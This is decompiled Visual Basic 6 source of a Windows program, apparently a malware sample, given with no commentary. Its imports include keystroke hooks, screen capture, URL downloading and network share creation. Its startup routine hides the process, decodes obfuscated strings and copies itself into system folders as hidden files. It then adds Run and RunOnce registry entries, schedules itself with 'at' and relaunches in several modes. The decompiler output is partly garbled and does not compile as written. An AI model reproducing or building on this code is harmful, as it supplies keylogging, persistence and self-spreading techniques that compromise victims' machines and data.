VERSION 5.00
Begin VB.Form frmExplorer
  BackColor = &H80000005&
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 0 'None
  Icon = "frmExplorer.frx":0
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  Visible = 0   'False
  ClientLeft = 0
  ClientTop = 0
  ClientWidth = 2775
  ClientHeight = 1575
  Appearance = 0 'Flat
  ShowInTaskbar = 0   'False
  StartUpPosition = 3 'Windows Default
  Moveable = 0   'False
  Begin PictureBox pic2
    BackColor = &HFFFBFF&
    ForeColor = &H80000008&
    Left = 840
    Top = 480
    Width = 240
    Height = 240
    Visible = 0   'False
    TabIndex = 3
    ScaleMode = 3
    AutoRedraw = True
    FontTransparent = True
    BorderStyle = 0 'None
    TabStop = 0   'False
    Appearance = 0 'Flat
  End
  Begin PictureBox pic1
    BackColor = &HFFFBFF&
    ForeColor = &H80000008&
    Left = 840
    Top = 120
    Width = 240
    Height = 240
    Visible = 0   'False
    TabIndex = 2
    ScaleMode = 3
    AutoRedraw = True
    FontTransparent = True
    BorderStyle = 0 'None
    TabStop = 0   'False
    Appearance = 0 'Flat
  End
  Begin uExWatch uExWatch1
    Index = 0
  End
  Begin Timer tmrSec
    Enabled = 0   'False
    Interval = 60000
    Left = 1080
    Top = 1080
  End
  Begin Timer tmrPri
    Enabled = 0   'False
    Interval = 60000
    Left = 600
    Top = 1080
  End
  Begin Timer Timer1
    Enabled = 0   'False
    Interval = 50
    Left = 120
    Top = 1080
  End
  Begin PictureBox picIcon
    BackColor = &HFFFBFF&
    ForeColor = &H0&
    Left = 1200
    Top = 120
    Width = 600
    Height = 600
    Visible = 0   'False
    TabIndex = 1
    ScaleMode = 3
    AutoRedraw = True
    FontTransparent = True
    BorderStyle = 0 'None
    TabStop = 0   'False
    Appearance = 0 'Flat
  End
  Begin PictureBox picCapt
    BackColor = &HFFFBFF&
    ForeColor = &H80000008&
    Left = 120
    Top = 120
    Width = 600
    Height = 600
    Visible = 0   'False
    TabIndex = 0
    ScaleMode = 3
    AutoRedraw = True
    FontTransparent = True
    BorderStyle = 0 'None
    TabStop = 0   'False
    Appearance = 0 'Flat
  End
End

Attribute VB_Name = "frmExplorer"

'VA: 409780
Private Declare Sub GetDIBits Lib "gdi32"()
'VA: 408834
Private Declare Function CloseHandle Lib "kernel32" Alias "CloseHandle" (ByVal hObject As Long) As Long
'VA: 408800
Private Declare Function SetFilePointer Lib "kernel32" Alias "SetFilePointer" (ByVal hFile As Long, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
'VA: 4087B8
Private Declare Function WriteFile Lib "kernel32" Alias "WriteFile" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, lpOverlapped As OVERLAPPED) As Long
'VA: 407B70
Private Declare Function ReadFile Lib "kernel32" Alias "ReadFile" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, lpOverlapped As OVERLAPPED) As Long
'VA: 407B2C
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
'VA: 407478
Private Declare Sub InternetCloseHandle Lib "wininet.dll"()
'VA: 40742C
Private Declare Sub InternetReadFile Lib "wininet.dll"()
'VA: 4073E0
Private Declare Sub InternetOpenUrlA Lib "wininet.dll"()
'VA: 407394
Private Declare Sub InternetOpenA Lib "wininet.dll"()
'VA: 40734C
Private Declare Sub NetShareDel Lib "Netapi32.dll"()
'VA: 407308
Private Declare Sub NetShareAdd Lib "Netapi32.dll"()
'VA: 4072B0
Private Declare Sub lstrcpyA Lib "kernel32"()
'VA: 40726C
Private Declare Function GlobalFree Lib "kernel32" Alias "GlobalFree" (ByVal hMem As Long) As Long
'VA: 407238
Private Declare Function GlobalAlloc Lib "kernel32" Alias "GlobalAlloc" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
'VA: 4071F4
Private Declare Function WNetCloseEnum Lib "mpr.dll" Alias "WNetCloseEnum" (ByVal hEnum As Long) As Long
'VA: 4071AC
Private Declare Function WNetEnumResource Lib "mpr.dll" Alias "WNetEnumResourceA" (ByVal hEnum As Long, lpcCount As Long, lpBuffer As Any, lpBufferSize As Long) As Long
'VA: 407160
Private Declare Function WNetOpenEnum Lib "mpr.dll" Alias "WNetOpenEnumA" (ByVal dwScope As Long, ByVal dwType As Long, ByVal dwUsage As Long, lpNetResource As NETRESOURCE, lphEnum As Long) As Long
'VA: 40710C
Private Declare Sub DeleteUrlCacheEntryA Lib "wininet.dll"()
'VA: 4070AC
Private Declare Sub URLDownloadToFileA Lib "urlmon"()
'VA: 407044
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
'VA: 406FFC
Private Declare Sub GetComputerNameA Lib "kernel32"()
'VA: 406FB0
Private Declare Sub Sleep Lib "kernel32"()
'VA: 406EF8
Private Declare Sub DestroyIcon Lib "user32"()
'VA: 406EA4
Private Declare Sub DrawIconEx Lib "user32"()
'VA: 406E60
Private Declare Function SHGetFileInfo Lib "shell32.dll" Alias "SHGetFileInfoA" (ByVal pszPath As String, ByVal dwFileAttributes As Long, psfi As SHFILEINFO, ByVal cbFileInfo As Long, ByVal uFlags As Long) As Long
'VA: 406BD8
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you the lpData parameter as String, you must pass it By Value.
'VA: 406B90
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
'VA: 406B48
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
'VA: 406AEC
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, lpdwDisposition As Long) As Long
'VA: 406AA4
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
'VA: 406A5C
Private Declare Function RegCloseKey Lib "advapi32.dll" Alias "RegCloseKey" (ByVal hKey As Long) As Long
'VA: 406A18
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'VA: 4069D0
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
'VA: 40698C
Private Declare Sub SHGetPathFromIDListA Lib "shell32.dll"()
'VA: 406918
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
'VA: 406880
Private Declare Sub GetFileAttributesA Lib "kernel32"()
'VA: 406768
Private Declare Sub SHGetSpecialFolderLocation Lib "shell32.dll"()
'VA: 4064BC
Private Declare Sub DeleteFileA Lib "kernel32"()
'VA: 4062CC
Private Declare Sub GetExitCodeProcess Lib "kernel32"()
'VA: 406280
Private Declare Function AdjustTokenPrivileges Lib "advapi32.dll" Alias "AdjustTokenPrivileges" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
'VA: 406218
Private Declare Function LookupPrivilegeValue Lib "advapi32.dll" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LARGE_INTEGER) As Long
'VA: 4061B8
Private Declare Sub GetCurrentProcess Lib "kernel32"()
'VA: 40616C
Private Declare Function OpenProcessToken Lib "advapi32.dll" Alias "OpenProcessToken" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
'VA: 40610C
Private Declare Sub FindClose Lib "kernel32"()
'VA: 4060C8
Private Declare Sub FindNextFileA Lib "kernel32"()
'VA: 406070
Private Declare Sub FindFirstFileA Lib "kernel32"()
'VA: 406028
Private Declare Sub OpenThread Lib "kernel32"()
'VA: 405FE4
Private Declare Function ResumeThread Lib "kernel32" Alias "ResumeThread" (ByVal hThread As Long) As Long
'VA: 405F9C
Private Declare Sub Thread32Next Lib "kernel32"()
'VA: 405F54
Private Declare Sub Thread32First Lib "kernel32"()
'VA: 405F0C
Private Declare Function TerminateProcess Lib "kernel32" Alias "TerminateProcess" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
'VA: 405EBC
Private Declare Sub GetModuleFileNameExA Lib "Psapi.dll"()
'VA: 405E5C
Private Declare Sub OpenProcess Lib "kernel32"()
'VA: 405E18
Private Declare Sub CloseHandle Lib "kernel32"()
'VA: 405DD4
Private Declare Sub Process32Next Lib "kernel32"()
'VA: 405D8C
Private Declare Sub Process32First Lib "kernel32"()
'VA: 405D44
Private Declare Sub CreateToolhelp32Snapshot Lib "kernel32"()
'VA: 405CFC
Private Declare Sub GetWindowThreadProcessId Lib "user32"()
'VA: 405CA8
Private Declare Sub ClientToScreen Lib "user32"()
'VA: 405C60
Private Declare Sub GdiplusShutdown Lib "gdiplus"()
'VA: 405C18
Private Declare Sub GdiplusStartup Lib "gdiplus"()
'VA: 405BD0
Private Declare Sub GdipDisposeImage Lib "gdiplus"()
'VA: 405B84
Private Declare Sub GdipSaveImageToFile Lib "gdiplus"()
'VA: 405B18
Private Declare Function WideCharToMultiByte Lib "kernel32" Alias "WideCharToMultiByte" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As String, ByVal cchWideChar As Long, ByVal lpMultiByteStr As String, ByVal cchMultiByte As Long, ByVal lpDefaultChar As String, ByVal lpUsedDefaultChar As Long) As Long
'VA: 405ACC
Private Declare Sub lstrlenW Lib "kernel32"()
'VA: 405A88
Private Declare Sub GdipGetImageEncoders Lib "gdiplus"()
'VA: 405A38
Private Declare Sub GdipGetImageEncodersSize Lib "gdiplus"()
'VA: 4059D8
Private Declare Sub GdipCreateBitmapFromHBITMAP Lib "gdiplus.dll"()
'VA: 405974
Private Declare Sub DeleteDC Lib "gdi32"()
'VA: 405930
Private Declare Sub CreateDCA Lib "gdi32"()
'VA: 4058EC
Private Declare Sub BitBlt Lib "gdi32"()
'VA: 40589C
Private Declare Sub GetWindowTextLengthA Lib "user32"()
'VA: 40583C
Private Declare Function GetKeyState Lib "user32" Alias "GetKeyState" (ByVal nVirtKey As Long) As Integer
'VA: 4057F8
Private Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState" (ByVal vKey As Long) As Integer
'VA: 4057AC
Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As Long
'VA: 405760
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
'VA: 405718
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
'VA: 4056C0
Private Declare Function CallNextHookEx Lib "user32" Alias "CallNextHookEx" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
'VA: 405678
Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hHook As Long) As Long
'VA: 40562C
Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long


Private Sub Form_Load() '40A840
  Dim arg_8 As Me
  Dim var_A0 As Variant
  Dim var_A8 As App
  var_4C = Global.App
  var_A4 = var_4C
  var_90 = Global.PrevInstance
  var_AC = var_90
  var_B0 = var_90
  If var_B0 Then
    End
  End If
  var_4C = Global.App
  var_A4 = var_4C
  var_A8 = var_4C
  Global.TaskVisible = False
  var_AC = var_A8
  var_eax = Unknown_VTable_Call[ecx+000001BCh]
  var_A0 = Unknown_VTable_Call[ecx+000001BCh]
  var_4C = Global.App
  var_A4 = var_4C
  var_34 = Global.Path
  var_AC = var_34
  var_38 = Right$(var_34, 1)
  eax = (var_38 = global_00406544) + 1
  var_B0 = (var_38 = global_00406544) + 1
  If var_B0 Then
    var_4C = Global.App
    var_A4 = var_4C
    var_34 = Global.Path
    var_AC = var_34
    var_2C = var_34
    GoTo loc_0040AEA9
  End If
  var_4C = Global.App
  var_A4 = var_4C
  var_34 = Global.Path
  var_AC = var_34
  var_2C = var_34 & global_00406544
  loc_0040AEA9: 
  var_eax = Proc_1_1_4115D0(var_34, arg_8, 0)
  global_0042C144 = Proc_1_1_4115D0(var_34, arg_8, 0)
  var_eax = Proc_8_3_429CA0(37, 0, esi)
  global_0042C134 = Proc_8_3_429CA0(37, 0, esi)
  var_A0 = var_124
  var_4C = Global.App
  var_A4 = var_4C
  var_34 = Global.EXEName
  var_AC = var_34
  global_0042C0CC = LCase$(var_2C & var_34 & global_00406BFC & global_0042C144)
  var_eax = Proc_8_3_429CA0(36, 0, fs:[00000000h])
  global_0042C130 = Proc_8_3_429CA0(36, 0, fs:[00000000h])
  var_eax = Proc_1_1_4115D0(var_34, , )
  global_0042C0D8 = Proc_1_1_4115D0(var_34, , )
  global_0042C0D4 = LCase$(global_0042C130 & "system\" & global_0042C0D8 & global_00406BFC & global_0042C144)
  var_34 = "MG>æ|ê◊™•vWe=<7óy{≤èá"
  var_eax = Proc_1_1_4115D0(var_34, , )
  global_0042C0E0 = Proc_1_1_4115D0(var_34, , )
  global_0042C0DC = LCase$(global_0042C130 & "system\" & global_0042C0E0 & global_00406BFC & global_0042C144)
  var_34 = "Àòò”ÜßÖ^i76?ëpq™èâÔŒ®˜º¥@S4"
  var_38 = global_0042C130 & "system\"
  var_eax = Proc_1_1_4115D0(var_34, var_38, )
  global_0042C160 =  & Proc_1_1_4115D0(var_34, var_38, )
  var_34 = "°~|+!3Ö^l76>ëpt™èãIK?:M9U]G"
  var_38 = global_0042C130 & "system\"
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C150 = LCase$( & Proc_1_1_4115D0(var_34, var_38))
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C10C = Proc_1_1_4115D0(var_34)
  var_eax = Proc_4_5_4228E0(global_0042C0CC)
  global_42C12C = Proc_4_5_4228E0(global_0042C0CC)
  On Error Resume Next
  global_0042C0D0 = Command$
  If (var_B4 = "RO") = 0 Then
    var_34 = global_0042C0D4 & " RU"
    var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0D8)
    var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0E0)
    var_eax = Proc_8_1_4296C0(global_0042C0D4, global_0042C0DC & " RU", global_0042C0DC & " RU")
    End
    GoTo loc_0040B9F2
  End If
  If (var_B4 = "MR") = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0D4, -1)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0D4)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0D4)
      SetAttr global_0042C0D4, 39
    End If
    var_34 = global_0042C0D4 & " RU"
    var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0D8)
    var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0E0)
    var_eax = Proc_8_1_4296C0(global_0042C0D4, global_0042C0DC & " RU", global_0042C0DC & " RU")
    var_84 = global_0042C0D4
    var_9C = Shell(global_0042C0D4, 0)
    End
    GoTo loc_0040B9F2
  End If
  If (var_B4 = "PR") = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0D4)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0D4)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0D4)
      SetAttr global_0042C0D4, 39
    End If
    var_84 = global_0042C0D4
    var_9C = Shell(global_0042C0D4, 0)
    End
    GoTo loc_0040B9F2
  End If
  If (var_B4 = "SE") = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0DC)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0DC)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0DC)
      SetAttr global_0042C0DC, 39
    End If
    var_84 = global_0042C0DC
    var_9C = Shell(global_0042C0DC, 0)
    End
    GoTo loc_0040B9F2
  End If
  If (var_B4 = "AO") = 0 Then
    If (global_0042C0CC = global_0042C150) = 0 Then
      var_eax = Proc_1_4_411F00(global_0042C160)
      If Proc_1_4_411F00(global_0042C160) = 0 Then
        var_eax = Proc_1_3_411B30
      End If
      If Len(global_0042C0B4) > 0 Then
  loc_0040B8AB: 
        If True Then
          DoEvents
          var_28 = InStr(var_24(1), global_0042C0B4, global_00406F58, 0)
          If var_28 = 0 Then
            Len(global_0042C0B4) = Len(global_0042C0B4) + 00000001h
            var_28 = Len(global_0042C0B4)+00000001h
          End If
          var_28 = var_28 - var_24
          var_28 = var_28 - 00000001h
          var_54 = var_28
          var_34 = Mid$(global_0042C0B4, var_24(1), var_28)
          var_eax = Proc_3_5_41F5C0(var_34)
          var_38 = Proc_3_5_41F5C0(var_34)
          var_24 = InStr(var_24(1), global_0042C0B4, global_00406F58, 0)
          var_eax = Sleep(global_0042C0B8)
          GoTo loc_0040B8AB
        End If
      End If
      End
  loc_0040B9F2: 
  loc_0040B9F2: 
  loc_0040B9F2: 
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C110 = Proc_1_1_4115D0(var_34)
  var_34 = "O5E—ûûDCCâsgπñáø¢ìÜÅi‡¡ùÊƒ®w¶v—Ï∑n∑uJ7[πÅÆïdåõyäw_{STc8js}ë°Yå{›◊‚„Ê‚ÈÔﬁõO©ıíïÊàãwpgßì◊∞´»¨í§°ÄVsJÔ⁄±åüqí®qb±mOà"
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C114 = Proc_1_1_4115D0(var_34)
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C118 = Proc_1_1_4115D0(var_34)
  var_34 = "yIb—°†Ö^l768ëpq™èäùnı◊∞@S8"
  var_eax = Proc_8_3_429CA0(28)
  var_38 = Proc_8_3_429CA0(28)
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C0F0 =  & Proc_1_1_4115D0(var_34, var_38)
  var_eax = Proc_8_3_429CA0(38)
  global_0042C138 = Proc_8_3_429CA0(38)
  var_38 = global_0042C130 & "system\"
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C0E4 = LCase$( & Proc_1_1_4115D0(var_34, var_38))
  var_34 = "Õ}èjHYÖ^i76<ëp|™èIK?:M8U]L"
  var_eax = Proc_8_3_429CA0(26)
  var_38 = Proc_8_3_429CA0(26)
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C0F4 =  & Proc_1_1_4115D0(var_34, var_38)
  var_eax = Proc_3_0_41E880
  global_0042C168 = Proc_3_0_41E880
  var_eax = Proc_3_1_41E9D0
  global_0042C16C = Proc_3_1_41E9D0
  If (global_0042C0CC = global_0042C0D4) = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0E4)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0E4)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0E4)
      SetAttr global_0042C0E4, 39
    End If
    var_54 = global_0042C0E4 & " SE"
    var_9C = Shell(global_0042C0E4 & " SE", 0)
    If global_42C12C = -1 Then
      var_eax = GetForegroundWindow
    End If
    var_eax = Proc_1_1_4115D0(var_34)
    global_0042C148 = Proc_1_1_4115D0(var_34)
    var_eax = Proc_1_1_4115D0(var_34)
    global_0042C14C = Proc_1_1_4115D0(var_34)
    var_34 = "∏pÑU8TÖ^l76=ëpo™èà‹¶°yn^@S4"
    var_38 = global_0042C130 & "system\"
    var_eax = Proc_1_1_4115D0(var_34, var_38)
    global_0042C0E8 =  & Proc_1_1_4115D0(var_34, var_38)
    var_38 = global_0042C130 & "system32\drivers\"
    var_eax = Proc_1_1_4115D0(var_34, var_38)
    global_0042C0EC =  & Proc_1_1_4115D0(var_34, var_38)
    var_eax = Proc_2_0_415EC0
    var_eax = Proc_2_1_416000
    tmrPri.Enabled = True
    var_A4 = var_A0
    var_40 = global_0042C130 & "system\" & global_0042C0D8 & global_00406BFC & global_0042C144
    var_eax = Proc_2_18_41A980(var_40, var_4C, arg_8)
    eax = Proc_2_18_41A980(var_40, var_4C, arg_8) + 1
    var_A0 = Proc_2_18_41A980(var_40, var_4C, arg_8) + 1
    If var_A0 Then
      var_3C = global_0042C130 & "system\" & global_0042C0D8 & global_00406BFC
      var_54 = var_3C & global_0042C144
      var_9C = Shell(var_3C & global_0042C144, 2)
    End If
    GoTo loc_0040CA0A
  End If
  If (global_0042C0CC = global_0042C0DC) = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0E4, arg_8)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0E4)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0E4)
      SetAttr global_0042C0E4, 39
    End If
    var_54 = global_0042C0E4 & " PR"
    var_9C = Shell(global_0042C0E4 & " PR", 0)
    var_eax = frmExplorer.VTable_00000730
    var_A0 = frmExplorer.VTable_00000730
    var_eax = frmExplorer.Proc_0_8_40CFE0(arg_8, arg_8, var_4C)
    var_eax = Proc_1_1_4115D0(var_34, var_4C, CreateObject(global_004075DC))
    global_0042C104 = Proc_1_1_4115D0(var_34, var_4C, CreateObject(global_004075DC))
    var_eax = Proc_1_1_4115D0(var_34)
    global_0042C108 = Proc_1_1_4115D0(var_34)
    var_eax = Proc_8_3_429CA0(28)
    global_0042C140 = Proc_8_3_429CA0(28)
    var_34 = "yLZîbÖ^j76<ëpt™èâIK?:M3U]K"
    var_eax = Proc_1_1_4115D0(var_34)
    global_0042C0FC = global_0042C140 & Proc_1_1_4115D0(var_34)
    var_eax = Proc_1_1_4115D0(var_34)
    Len(global_0042C140) = Len(global_0042C140) - 00000001h
    global_0042C140 = Left$(global_0042C140, Len(global_0042C140))
    var_94 = InStrRev(global_0042C140, global_00406544, -1, 0)
    var_eax = = Time$
    var_54 = Mid$(global_0042C140, var_94(1), 10)
    var_3C = "at " & FormatDateTime(DateAdd(global_00407C78, 0, global_40000000), 4) & Proc_1_1_4115D0(FormatDateTime(DateAdd(global_00407C78, 0, global_40000000), 4))
    var_74 = var_3C & global_0042C0CC
    var_9C = Shell(var_3C & global_0042C0CC, 0)
    tmrSec.Enabled = True
    var_A4 = var_A0
    GoTo loc_0040CA0A
  End If
  var_eax = Proc_1_1_4115D0(var_34, var_4C, arg_8)
  var_38 = "åkh—õ•"
  var_eax = Proc_1_1_4115D0(var_38, arg_8, var_5C)
  SaveSetting(global_0042C0D8, Proc_1_1_4115D0(var_34, var_4C, arg_8), Proc_1_1_4115D0(var_38, arg_8, var_5C), global_00407CC4)
  var_40 = global_0042C0CC & Chr$(160)
  var_3C = global_0042C0F0 & global_00406BFC & global_0042C144
  var_eax = Proc_4_2_4218D0(global_0042C0CC, var_3C, var_40)
  var_A0 = Proc_4_2_4218D0(global_0042C0CC, var_3C, var_40)
  If var_A0 Then
    End
    GoTo loc_0040C90E
  End If
  var_eax = Proc_4_5_4228E0(global_0042C0D4)
  If global_42C12C > 0 Then
    var_30 = (Timer + global_401560)
  loc_0040C80A: 
    var_eax = Proc_2_17_41A5A0(global_00407CCC & global_0042C0D4 & global_00407CCC & global_0042C0DC & global_00407CCC)
    var_eax = Proc_1_9_415AF0(global_0042C0D4)
    DoEvents
    var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0D4)
    If Proc_4_9_4259A0(global_0042C0CC, global_0042C0D4) Then
      GoTo loc_0040C8F8
    End If
    If Err.Number <> 0 Then GoTo loc_0040C80A
  loc_0040C8F8: 
    SetAttr global_0042C0D4, 39
  loc_0040C90E: 
  loc_0040C90E: 
  var_eax = Proc_1_1_4115D0(var_34)
  var_38 = "åkf—õö"
  var_eax = Proc_1_1_4115D0(var_38)
  SaveSetting(global_0042C0D8, Proc_1_1_4115D0(var_34), Proc_1_1_4115D0(var_38), global_00407CC4)
  var_84 = global_0042C0D4
  var_9C = Shell(global_0042C0D4, 0)
  End
  loc_0040CA0A: 
  SetAttr global_0042C0CC, 39
  var_38 = global_0042C0D4 & " RO"
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0D8)
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0E0)
  var_eax = Proc_8_1_4296C0(global_0042C0D4, global_0042C0DC & " RO", global_0042C0DC & " RO")
  var_eax = Proc_4_5_4228E0(global_0042C0F4)
  If global_42C12C > 0 Then
    var_eax = Proc_1_9_415AF0(global_0042C0F4)
    var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0F4)
    SetAttr global_0042C0F4, 39
  End If
  var_eax = Proc_8_2_429830(global_0042C0F4 & " MR", global_0042C110, global_0042C114)
  var_eax = Proc_8_4_429E10(global_80000002, global_0042C10C, global_0042C0D8)
  var_eax = Proc_8_4_429E10(global_80000002, global_0042C10C, global_0042C0E0)
  var_eax = Proc_1_1_4115D0(var_34, global_0042C118)
  global_0042C11C = Proc_1_1_4115D0(var_34, global_0042C118)
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C120 = Proc_1_1_4115D0(var_34)
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C124 = Proc_1_1_4115D0(var_34)
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C128 = Proc_1_1_4115D0(var_34)
  var_38 = global_0042C130 & "system\"
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C154 =  & Proc_1_1_4115D0(var_34, var_38)
  var_38 = global_0042C130 & "system\"
  var_eax = Proc_1_1_4115D0(var_34, var_38)
  global_0042C158 =  & Proc_1_1_4115D0(var_34, var_38)
  global_0042C164 = global_0042C134 & "at." & global_0042C144
  var_eax = Proc_1_1_4115D0(var_34)
  global_0042C15C = Proc_1_1_4115D0(var_34)
  var_eax = Proc_1_4_411F00(global_0042C160)
  If Proc_1_4_411F00(global_0042C160) = 0 Then
    var_eax = Proc_1_3_411B30
  End If
  var_A0 = var_4C
  Timer1.Enabled = True
  var_A4 = var_A0
  GoTo loc_0040CF9B
  Exit Sub
  loc_0040CF9B: 
  Exit Sub
End Sub

Private Sub Form_Unload(Cancel As Integer) '40DAA0
  On Error Resume Next
  var_24 = global_0042C0D4 & " RU"
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0D8)
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C, global_0042C0E0)
  var_eax = Proc_415FD0(global_0042C0DC & " RU", global_0042C0DC & " RU", -1)
  var_eax = Proc_416100(edi, esi, ebx)
  GoTo loc_0040DBC5
  Exit Sub
  loc_0040DBC5: 
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer) '40D850
  On Error Resume Next
  If UnloadMode <> 2 Then
  End If
  var_28 = global_0042C0D4 & " RO"
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0D8)
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0E0)
  var_eax = Proc_8_1_4296C0(global_0042C0D4, global_0042C0DC & " RO", global_0042C0DC & " RO")
  var_eax = Proc_4_5_4228E0(global_0042C0F4, -1, edi)
  If global_42C12C > 0 Then
    var_eax = Proc_1_9_415AF0(global_0042C0F4, esi, ebx)
    var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0F4, )
    SetAttr global_0042C0F4, 39
  End If
  var_eax = Proc_8_2_429830(global_0042C0F4 & " MR", global_0042C110, global_0042C114)
  GoTo loc_0040DA75
  Exit Sub
  loc_0040DA75: 
End Sub

Private Sub tmrPri_Timer() '40E330
  Dim arg_8 As Me
  Dim var_2EC As Me
  Dim var_38 As Variant
  On Error Resume Next
  var_ret_1 = global_0042C130 & "system\" & "*." & global_0042C148
  var_eax = FindFirstFileA(var_ret_1, var_42C, " ?", var_42C, var_288)
  var_2C = FindFirstFileA(var_ret_1, var_42C, " ?", var_42C, var_288)
  If var_2C <> -1 Then
  loc_0040E48C: 
    call __vbaStrFixstr(00000104h, var_25C, " ?", var_288, var_42C, FFFFFFFFh, edi, esi, ebx)
    var_290 = __vbaStrFixstr(00000104h, var_25C, " ?", var_288, var_42C, FFFFFFFFh, edi, esi, ebx)
    var_eax = Proc_2_19_41AD60(var_290)
    call __vbaLsetFixstr(00000104h, var_25C, var_290)
    var_28 = Proc_2_19_41AD60(var_290)
    var_2DC = InStrRev(var_28, global_00406BFC, -1, 0)
    var_28C = LCase$(Mid$(var_28, FindFirstFileA(var_ret_1, var_42C, " ?", var_42C, var_288)(1), 10))
    If (var_28C = global_0042C148) = 0 Then
      var_34 = global_0042C130 & "system\" & var_28
